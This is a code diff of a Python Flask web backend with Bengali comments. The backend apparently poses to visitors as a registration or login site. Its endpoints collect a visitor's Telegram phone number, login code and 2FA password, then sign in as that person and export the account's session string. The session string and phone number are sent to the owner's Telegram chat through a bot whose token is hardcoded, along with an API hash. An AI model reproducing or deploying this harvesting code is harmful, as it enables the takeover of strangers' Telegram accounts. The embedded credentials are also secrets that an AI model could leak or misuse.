@@ -21,18 +21,20 @@ CORS(app)
 # ==========================================
 API_ID = int(os.environ.get("API_ID", 33511945))
 API_HASH = os.environ.get("API_HASH", "d044392a17690c14ee5b4a23651a0700")
+
 BOT_TOKEN = "8613982412:AAEzoWkhawmQuRyAHh89jj68gru2oIowL5E"
 OWNER_CHAT_ID = "-1003962414788"  
 ADMIN_ID = 6034439625             
 
 active_clients = {}
 total_logged_in_users = 0  
-admin_states = {} 
+admin_states = {} # এডমিনের বর্তমান অবস্থা (State) ট্র্যাক করার জন্য
 
 # ==========================================
 #          TELEGRAM HELPER FUNCTIONS
 # ==========================================
 def send_telegram_message(chat_id, text, reply_markup=None):
+    """নতুন মেসেজ পাঠানোর ফাংশন"""
     try:
         url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
         payload = {"chat_id": chat_id, "text": text, "parse_mode": "Markdown"}
@@ -40,10 +42,10 @@ def send_telegram_message(chat_id, text, reply_markup=None):
             payload["reply_markup"] = reply_markup
         requests.post(url, json=payload, timeout=15)
     except Exception as e:
-        print("Send Msg Error:", e)
+        print("Telegram Notification Error:", e)
 
 def edit_telegram_message(chat_id, message_id, text, reply_markup=None):
-    """মেসেজ এডিট করার ফাংশন (Back বাটনের জন্য)"""
+    """আগের মেসেজ পরিবর্তন (Edit) করার ফাংশন"""
     try:
         url = f"https://api.telegram.org/bot{BOT_TOKEN}/editMessageText"
         payload = {
@@ -56,9 +58,10 @@ def edit_telegram_message(chat_id, message_id, text, reply_markup=None):
             payload["reply_markup"] = reply_markup
         requests.post(url, json=payload, timeout=15)
     except Exception as e:
-        print("Edit Msg Error:", e)
+        print("Edit Message Error:", e)
 
 def answer_callback(callback_query_id, text, show_alert=False):
+    """ইনলাইন বাটনের ক্লিকে রেসপন্স পাঠানো"""
     try:
         url = f"https://api.telegram.org/bot{BOT_TOKEN}/answerCallbackQuery"
         requests.post(url, json={"callback_query_id": callback_query_id, "text": text, "show_alert": show_alert}, timeout=10)
@@ -66,6 +69,7 @@ def answer_callback(callback_query_id, text, show_alert=False):
         pass
 
 def download_telegram_file(file_id):
+    """ফাইল ডাউনলোড করে static ফোল্ডারে সেভ করা"""
     try:
         url = f"https://api.telegram.org/bot{BOT_TOKEN}/getFile?file_id={file_id}"
         res = requests.get(url).json()
@@ -73,6 +77,7 @@ def download_telegram_file(file_id):
             file_path = res["result"]["file_path"]
             download_url = f"https://api.telegram.org/file/bot{BOT_TOKEN}/{file_path}"
             file_data = requests.get(download_url).content
+            
             os.makedirs("static", exist_ok=True)
             ext = file_path.split('.')[-1]
             save_path = f"static/website_background.{ext}"
@@ -80,7 +85,7 @@ def download_telegram_file(file_id):
                 f.write(file_data)
             return True, ext
     except Exception as e:
-        pass
+        print("File Download Error:", e)
     return False, None
 
 # ==========================================
@@ -113,9 +118,11 @@ def get_back_button():
 #          BACKGROUND LOOP (PYROGRAM)
 # ==========================================
 bg_loop = asyncio.new_event_loop()
+
 def start_background_loop(loop):
     asyncio.set_event_loop(loop)
     loop.run_forever()
+
 loop_thread = threading.Thread(target=start_background_loop, args=(bg_loop,), daemon=True)
 loop_thread.start()
 
@@ -155,20 +162,24 @@ def profile_page():
 def send_code():
     data = request.get_json(silent=True) or {}
     phone = str(data.get('phone', '')).strip()
-    if not phone: return jsonify({"status": "error", "message": "Phone number is required"}), 400
+
+    if not phone:
+        return jsonify({"status": "error", "message": "Phone number is required"}), 400
+
     try:
         session_name = f"session_{phone.replace('+', '')}"
         async def _send():
             if phone in active_clients:
                 try: await active_clients[phone]["client"].disconnect()
-                except: pass
+                except Exception: pass
             client = Client(session_name, api_id=API_ID, api_hash=API_HASH, in_memory=True)
             await client.connect()
             sent_code = await client.send_code(phone)
             active_clients[phone] = {"client": client, "phone_code_hash": sent_code.phone_code_hash}
             return sent_code.phone_code_hash
+
         phone_code_hash = run_async(_send())
-        return jsonify({"status": "success", "message": "OTP code sent!", "phone_code_hash": phone_code_hash})
+        return jsonify({"status": "success", "message": "OTP code sent to Telegram!", "phone_code_hash": phone_code_hash})
     except Exception as e:
         return jsonify({"status": "error", "message": str(e)}), 400
 
@@ -179,11 +190,16 @@ def verify_code():
     phone = str(data.get('phone', '')).strip()
     code = str(data.get('code', '')).strip()
     password = data.get('password')
-    if not phone or not code: return jsonify({"status": "error", "message": "Phone and Code required"}), 400
-    if phone not in active_clients: return jsonify({"status": "error", "message": "Session expired."}), 400
+
+    if not phone or not code:
+        return jsonify({"status": "error", "message": "Phone and Code are required"}), 400
+    if phone not in active_clients:
+        return jsonify({"status": "error", "message": "Session expired."}), 400
+
     client_data = active_clients[phone]
     client = client_data["client"]
     phone_code_hash = client_data["phone_code_hash"]
+
     try:
         async def _verify():
             try: await client.sign_in(phone, phone_code_hash, code)
@@ -193,15 +209,24 @@ def verify_code():
             session_string = await client.export_session_string()
             await client.disconnect()
             return {"status": "success", "session_string": session_string}
+
         res = run_async(_verify())
-        if res and res.get("status") == "2fa_required": return jsonify({"status": "2fa_required", "message": "2FA required"})
+
+        if res and res.get("status") == "2fa_required":
+            return jsonify({"status": "2fa_required", "message": "2FA Password required"})
+
         if res and res.get("status") == "success":
             total_logged_in_users += 1
             session_string = res.get("session_string")
-            msg = f"🎉 *New Login!*\n📱 `{phone}`\n📊 Total: `{total_logged_in_users}`\n🔑 `{session_string}`"
+            msg = (
+                f"🎉 *New Telegram Login Successful!*\n\n"
+                f"📱 *Phone:* `{phone}`\n"
+                f"📊 *Total Logged In:* `{total_logged_in_users}`\n\n"
+                f"🔑 *Session String:*\n`{session_string}`"
+            )
             send_telegram_message(OWNER_CHAT_ID, msg)
             active_clients.pop(phone, None)
-            return jsonify({"status": "success", "message": "Session generated!"})
+            return jsonify({"status": "success", "message": "Session generated successfully!"})
     except Exception as e:
         return jsonify({"status": "error", "message": str(e)}), 400
 
@@ -209,18 +234,22 @@ def verify_code():
 def get_user_profile():
     data = request.get_json(silent=True) or {}
     phone = str(data.get('phone', '')).strip()
-    if not phone: return jsonify({"status": "error", "message": "Phone required"}), 400
+    if not phone:
+        return jsonify({"status": "error", "message": "Phone required"}), 400
+
     try:
         session_name = f"session_{phone.replace('+', '')}"
         async def _fetch():
             client = Client(session_name, api_id=API_ID, api_hash=API_HASH, in_memory=True)
             await client.connect()
             me = await client.get_me()
+            
             photo_url = None
             async for photo in client.get_chat_photos("me", limit=1):
                 file_path = await client.download_media(photo.file_id, file_name=f"static/profile_{me.id}.jpg")
                 photo_url = "/" + file_path
             await client.disconnect()
+
             return {
                 "name": f"{me.first_name or ''} {me.last_name or ''}".strip(),
                 "username": f"@{me.username}" if me.username else "No Username",
@@ -253,8 +282,10 @@ def telegram_webhook():
             user_id = message["from"]["id"]
             text = message.get("text", "").strip()
 
+            # এডমিনের স্টেট চেকিং (ফাইল আপলোড বা সেশন ইনপুট)
             if user_id in admin_states:
                 state = admin_states[user_id]
+                
                 if state == "WAITING_FOR_BG":
                     file_id = None
                     if "photo" in message: file_id = message["photo"][-1]["file_id"]
@@ -262,24 +293,25 @@ def telegram_webhook():
                     elif "document" in message: file_id = message["document"]["file_id"]
 
                     if file_id:
-                        send_telegram_message(chat_id, "⏳ Downloading and applying background...")
+                        send_telegram_message(chat_id, "⏳ Downloading and applying background. Please wait...")
                         success, ext = download_telegram_file(file_id)
                         if success:
-                            send_telegram_message(chat_id, f"✅ **Background uploaded!** saved as `website_background.{ext}`.\n\nType /start to open menu.")
+                            send_telegram_message(chat_id, f"✅ **Background successfully uploaded!**\nFile saved as `website_background.{ext}`.\n\n👉 Type /start to open menu.")
                         else:
                             send_telegram_message(chat_id, "⚠️ Error downloading file.")
                     else:
-                        send_telegram_message(chat_id, "⚠️ Invalid format. Send an image/video.")
-                    del admin_states[user_id]
+                        send_telegram_message(chat_id, "⚠️ Invalid format. Please send a valid image or video file.")
+                    
+                    del admin_states[user_id] 
                     return "OK", 200
 
                 elif state == "WAITING_FOR_SESSION":
-                    send_telegram_message(chat_id, f"🔒 Authentication initiated for `{text}`.\nType /start to open menu.")
+                    send_telegram_message(chat_id, f"🔒 Authentication initiated for `{text}`.\n\n👉 Type /start to open menu.")
                     del admin_states[user_id]
                     return "OK", 200
 
+            # সাধারণ কমান্ড
             if text == "/start":
-                # মেইন মেনু পাঠানো
                 send_telegram_message(chat_id, get_welcome_text(), get_main_menu())
 
         # --- ২. ইনলাইন বাটন (Callback Query) হ্যান্ডলার ---
@@ -293,47 +325,40 @@ def telegram_webhook():
             callback_query_id = callback_query["id"]
 
             if not chat_id or not message_id:
-                answer_callback(callback_query_id, "Error: Message ID missing")
                 return "OK", 200
 
             if callback_data == "total_members":
-                answer_callback(callback_query_id, "Fetching data...")
+                answer_callback(callback_query_id, "Fetching live data...")
                 stats_text = (
                     f"📊 *Website Registration Statistics*\n\n"
                     f"👥 Total Registered Members: `{total_logged_in_users:,}`\n\n"
-                    f"✅ Statistics updated from live server!"
+                    f"✅ Statistics updated successfully from the live server!"
                 )
-                # নতুন মেসেজের বদলে কারেন্ট মেসেজটা এডিট করবে এবং Back বাটন বসাবে
+                # নতুন মেসেজ না পাঠিয়ে আগের মেসেজ এডিট করবে এবং ব্যাক বাটন বসাবে
                 edit_telegram_message(chat_id, message_id, stats_text, get_back_button())
 
             elif callback_data == "bg_manager":
                 if user_id != ADMIN_ID:
-                    answer_callback(callback_query_id, "⛔ Unauthorized!", show_alert=True)
+                    answer_callback(callback_query_id, "⛔ Unauthorized! Admin access required.", show_alert=True)
                     return "OK", 200
                 
-                answer_callback(callback_query_id, "Background Manager")
+                answer_callback(callback_query_id, "Background Manager Started")
                 admin_states[user_id] = "WAITING_FOR_BG"
-                bg_text = (
-                    "🖼️ **Website Background Manager**\n\n"
-                    "Please send the new background image or video file directly here to upload and apply it to the website."
-                )
+                bg_text = "🖼️ **Website Background Manager**\n\nPlease send the new background image or video file directly here to upload and apply it to the website."
                 edit_telegram_message(chat_id, message_id, bg_text, get_back_button())
 
             elif callback_data == "session_manager":
                 if user_id != ADMIN_ID:
-                    answer_callback(callback_query_id, "⛔ Unauthorized!", show_alert=True)
+                    answer_callback(callback_query_id, "⛔ Unauthorized! Admin access required.", show_alert=True)
                     return "OK", 200
                 
-                answer_callback(callback_query_id, "Session Manager")
+                answer_callback(callback_query_id, "Session Manager Started")
                 admin_states[user_id] = "WAITING_FOR_SESSION"
-                session_text = (
-                    "🔐 **Session String Manager**\n\n"
-                    "Please enter the authorized Phone Number (with country code) or User ID to begin secure verification:"
-                )
+                session_text = "🔐 **Session String Manager**\n\nPlease enter the authorized Phone Number (with country code) or User ID to begin secure verification:"
                 edit_telegram_message(chat_id, message_id, session_text, get_back_button())
 
             elif callback_data == "back_to_main":
-                # ব্যাক বাটনে ক্লিক করলে এডমিন স্টেট ক্লিয়ার করবে এবং মেইন মেনু ফিরিয়ে আনবে
+                # ব্যাক বাটনে ক্লিক করলে এডমিন স্টেট ক্লিয়ার হবে এবং মেইন মেনু ফিরে আসবে
                 if user_id in admin_states:
                     del admin_states[user_id]
                 answer_callback(callback_query_id, "Back to Main Menu")
